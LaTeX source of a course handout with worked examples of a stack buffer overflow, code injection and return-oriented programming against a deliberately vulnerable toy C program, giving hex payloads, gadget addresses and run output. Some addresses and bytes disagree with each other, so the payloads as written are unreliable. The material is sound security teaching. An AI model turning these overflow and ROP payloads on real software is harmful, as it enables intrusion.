\documentclass{article}
\usepackage{amsmath}
% \usepackage{cancel}
\usepackage{fancyhdr}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage[procnames]{listings}
\lstset{language=C, alsolanguage=[x86masm]Assembler, tabsize=4, upquote=true, basicstyle=\ttfamily}
\usepackage{xcolor}
\newcommand{\function}[1]{\textbf{\lstinline{#1}}}

% \pagestyle{fancy}
% \fancyfoot{}
% \lfoot{\copyright\ Christopher A. Bohn}
% %% (c) 2018-22
% \rfoot{Page \thepage}

\fancypagestyle{plain}{
    \fancyhf{}
    \lfoot{\copyright\ Christopher A. Bohn} % (c) 2018-22
    \rfoot{Page \thepage}
    \renewcommand{\headrulewidth}{0pt}
    \renewcommand{\footrulewidth}{0pt}
}
\pagestyle{plain}

\newcommand{\carry}{\scriptstyle 1}

\begin{document}

\title{Chapter 11a Worked Examples}
\date{}
\maketitle

NOTE: The addresses of buffers, functions, and gadgets may be different when you compile than what's shown here -- so you probably should construct your own strings based on what you see after disassembly.

Our victim (\textit{target.c}):

\begin{lstlisting}[language=C, numbers=left]
#include <stdio.h>
#include <stdlib.h>

char global_buffer[512] = {0};

void kick_me() {
    printf("This function exists only to provide ROP instructions.\n");
    __asm__(
            "addq %rsi, %rdi\n"
            "ret\n"
            "movl $15, %edi\n"
            "ret\n"
            "movq %rdi, %rax\n"
            "nop\n"
            "nop\n"
            "ret\n"
//            "movq $53, %rsi\n"
            "movabsq $0x35c6c74800, %rbp\n"
            "nop\n"
            "ret\n"
            );
    printf("There really isn't any other point to it.\n");
}

void print_integer(int number) {
    printf("The number is %d\n", number);
//    exit(0);
}

void get_inputs() {
    char local_buffer[24];
//    printf("Let's put something in the global buffer at address %p: \n", global_buffer);
//    fgets(global_buffer, 512, stdin);
    printf("Now the local buffer at address %p: \n", local_buffer);
    gets(local_buffer);
    print_integer(231);
}

void bar() {
    get_inputs();
    printf("Back in bar.\n");
}

void foo() {
    bar();
    printf("Back in foo.\n");
}

int main() {
    foo();
    printf("Back in main.\n");
    return 0;
}
\end{lstlisting}

Compile: \\ \textit{gcc -Og -std=c99 -fno-stack-protector -Wa,-\hspace{1pt}-execstack -o target target.c}

We'll get a warning because of \function{gets()}.

The ``-fno-stack-protector'' argument makes sure that there isn't a stack canary, regardless of what this installation of gcc is configured to do.
The \\ ``-Wa,-\hspace{1pt}-execstack'' instructs the assembler to configure the stack to allow executable code on the stack.
(Both of these are obviously bad ideas.
Also, as we'll see, we're not going to take advantage of not having executable code on the stack.)

Run the program: \\
\textit{./target} \\
\texttt{Now the local buffer at address 0x7ffd613c9090: } {\footnotesize (You  may get a different address)} \\
\textit{hello, world} \\
\texttt{The number is 231 \\
Back in bar. \\
Back in foo. \\
Back in main.}

Let's take a look at how much space is actually allocated for that buffer. \\
\textit{objdump -d target $|$ grep -A 11 get\_inputs} {\footnotesize (This will show the 11 lines after the beginning of the function and also after the call to the function)} \\
\begin{lstlisting}[language={[x86masm]Assembler}]
00000000004005ea <get_inputs>:
  4005ea:       48 83 ec 28             sub    $0x28,%rsp
  4005ee:       48 89 e6                mov    %rsp,%rsi
  4005f1:       bf 90 07 40 00          mov    $0x400790,%edi
  4005f6:       b8 00 00 00 00          mov    $0x0,%eax
  4005fb:       e8 a0 fe ff ff          call   4004a0 <printf@plt>
  400600:       48 89 e7                mov    %rsp,%rdi
  400603:       e8 a8 fe ff ff          call   4004b0 <gets@plt>
  400608:       bf e7 00 00 00          mov    $0xe7,%edi
  40060d:       e8 be ff ff ff          call   4005d0 <print_integer>
  400612:       48 83 c4 28             add    $0x28,%rsp
  400616:       c3                      ret
--
  400620:       e8 c5 ff ff ff          call   4005ea <get_inputs>
  400625:       bf c8 07 40 00          mov    $0x4007c8,%edi
  40062a:       e8 61 fe ff ff          call   400490 <puts@plt>
  40062f:       48 83 c4 08             add    $0x8,%rsp
  400633:       c3                      ret

0000000000400634 <foo>:
  400634:       48 83 ec 08             sub    $0x8,%rsp
  400638:       b8 00 00 00 00          mov    $0x0,%eax
  40063d:       e8 d5 ff ff ff          call   400617 <bar>
  400642:       bf d5 07 40 00          mov    $0x4007d5,%edi
  400647:       e8 44 fe ff ff          call   400490 <puts@plt>
\end{lstlisting}

There are 0x28 bytes between the start of the buffer and the return address to \function{bar()}. Let's start constructing our exploit code.

\begin{verbatim}
/* 0x28 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* return address follows */
\end{verbatim}

Let's add $20+53$ and have \function{print_integer()} print that instead of 231.
The assembly code we need is
\begin{lstlisting}[language={[x86masm]Assembler}]
movq $20, %rdi
addq $53, %rdi
ret
\end{lstlisting}
and we need to put the address of \function{print_integer()} as the ``return address'' for that \lstinline{ret} instruction.

Place that assembly code in a file and then assemble it to get the necessary bytes: \\
\textit{
gcc -c injection-code.s
objdump -d injection-code.o
}
\begin{lstlisting}[language={[x86masm]Assembler}]
0:   48 c7 c7 14 00 00 00    mov    $0x14,%rdi
7:   48 83 c7 35             add    $0x35,%rdi
b:   c3                      ret
\end{lstlisting}

The target address is 0x400660: \\
\textit{objdump -d target $|$ grep print\_integer}
\begin{lstlisting}[language={[x86masm]Assembler}]
0000000000400660 <print_integer>:
  4006c7:       e8 94 ff ff ff          call   400660 <print_integer>
\end{lstlisting}

The last thing we need is the address where our code will be -- and our victim helpfully provided the buffer's address.

\begin{verbatim}
/* mov $0x14,%rdi */
48 c7 c7 14 00 00 00
/* add $0x35,%rdi */
                     48
83 c7 35
/* ret */
         c3
/* padding */
            00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* exploit code's address */
90 90 3c 61 fd 7f 00 00   /* don't forget byte-reversal for little-endian */
/* print_integer's address */
c7 06 40 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
\end{verbatim}

Note: this will break the requirement for 16-byte stack alignment.

There's a more significant problem, though... \\
\textit{
./hex2raw \textless\ injection-code.hex \textgreater\ injection-code.raw \\
./target \textless\ injection-code.raw \\
}
\texttt{
Now the local buffer at address 0x7fff9bf3e0d0: \\
The number is 231 \\
Back in bar. \\
Back in foo. \\
Back in main. \\
}

The buffer is at a different address than we expected!
The reason is a randomized stack offset.
This is something we generally can only turn off if we have root privileges.
(In the lab, we use other trickery.)

% Fortunately(?), our Linux server doesn't have the full address space randomized, so a global variable, such as \lstinline{global_buffer} will be at the same address every time.
% Uncomment lines 32--33, recompile, and take another look at the disassembled code:
% \textit{
% gcc -Og -std=c99 -fno-stack-protector -Wa,--execstack -o target target.c \\
% objdump -d target $|$ grep -B 2 fgets
% }
% \begin{lstlisting}[language={[x86masm]Assembler}]
%   40052b:       e9 d0 ff ff ff          jmp    400500 <_init+0x20>
%
% 0000000000400530 <fgets@plt>:
%   400530:       ff 25 f2 0a 20 00       jmp    *0x200af2(%rip)        # 601028 <fgets@GLIBC_2.2.5>
% --
%   400699:       be 00 02 00 00          mov    $0x200,%esi
%   40069e:       bf 80 10 60 00          mov    $0x601080,%edi
%   4006a3:       e8 88 fe ff ff          call   400530 <fgets@plt>
% \end{lstlisting}
%
% The global buffer is at 0x601080.
% What we're going to have to do here (but not in the lab) is use the global buffer for our exploit code and then overflow the local buffer to put in the return addresses.
%
%
% \begin{verbatim}
% /* mov $0x14,%rdi */
% 48 c7 c7 14 00 00 00
% /* add $0x35,%rdi */
% 48 83 c7 35
% /* ret */
% c3
% /* newline, to end the fgets call that uses global buffer */
% 0a
% /* gets uses the local buffer, and we'll overflow it */
% 00 00 00 00 00 00 00 00
% 00 00 00 00 00 00 00 00
% 00 00 00 00 00 00 00 00
% 00 00 00 00 00 00 00 00
% 00 00 00 00 00 00 00 00
% /* exploit code's address */
% 80 10 60 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
% /* print_integer's address */
% 60 06 40 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
% \end{verbatim}

We'll now use return-oriented programming, which doesn't require an executable stack and isn't bothered by a variable stack offset. Fortunately(?), our Linux server doesn't have the full address space randomized.

There are other ways to add the two numbers together than the instructions that we tried earlier, and this program is seeded with
\begin{lstlisting}[language={[x86masm]Assembler}]
movl $20, %edi
movq $53, %rsi
addq %rsi %rdi
\end{lstlisting}

We need to look for these instructions, followed by zero or more NOPs, followed by return. \\

\textit{objdump -d target $|$ grep -A 19 kick\_me}
\begin{lstlisting}[language={[x86masm]Assembler}]
0000000000400597 <kick_me>:
  400597:       48 83 ec 08             sub    $0x8,%rsp
  40059b:       bf 28 07 40 00          mov    $0x400728,%edi
  4005a0:       e8 eb fe ff ff          call   400490 <puts@plt>
  4005a5:       48 01 f7                add    %rsi,%rdi
  4005a8:       c3                      ret
  4005a9:       bf 0f 00 00 00          mov    $0x14,%edi
  4005ae:       c3                      ret
  4005af:       48 89 f8                mov    %rdi,%rax
  4005b2:       90                      nop
  4005b3:       90                      nop
  4005b4:       c3                      ret
  4005b5:       48 bd 00 48 c7 c6 35    movabs $0x35c6c74800,%rbp
  4005bc:       00 00 00
  4005bf:       90                      nop
  4005c0:       c3                      ret
  4005c1:       bf 60 07 40 00          mov    $0x400760,%edi
  4005c6:       e8 c5 fe ff ff          call   400490 <puts@plt>
  4005cb:       48 83 c4 08             add    $0x8,%rsp
  4005cf:       c3                      ret
\end{lstlisting}

\lstinline{movl $0x14, %edi} followed by \lstinline{ret} is at 0x4005a9.
\lstinline{addq %rsi, %rdi} followed by \lstinline{ret} is at 0x4005a5.
But where is \lstinline{movq $53, %rsi}?

We can find out what the desired bytes are by using the assembler like we did when creating our code injection earlier, and the bytes we want are 48~c7~c6~35~00~00~00.

Those bytes appear in the middle of another instruction!
If we point the instruction pointer to 0x4005b8, we'll find \lstinline{movq $0x35, %rsi} followed by \lstinline{nop} and \lstinline{ret}.

Let's create a string that overflows the buffer and then has ``return addresses'' for those gadgets, followed by \function{print_integer}'s address.

\begin{verbatim}
/* 0x28 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* gadget addresses follow */
a9 05 40 00 00 00 00 00 /* movl $20, %edi */
b8 05 40 00 00 00 00 00 /* movq $53, %rsi */
a5 05 40 00 00 00 00 00 /* addq %rsi, %rdi */
/* print_integer */
d0 05 40 00 00 00 00 00
\end{verbatim}

\textit{
./hex2raw \textless\ rop-attack.hex \textgreater\ rop-attack.raw \\
./target \textless\ rop-attack.raw \\
}
\begin{verbatim}
Now the local buffer at address 0x7ffd4a48ec60:
The number is 231
The number is 73
The number is 231
Now the local buffer at address 0x7ffd4a48ec88:
The number is 231
Back in bar.
Back in foo.
Back in main.
Segmentation fault (core dumped)
\end{verbatim}

Well, at one point we had the sum of $20+53$ printed.

I'm going to have to trace through the execution to figure out why it didn't go exactly as I wanted.

\end{document}
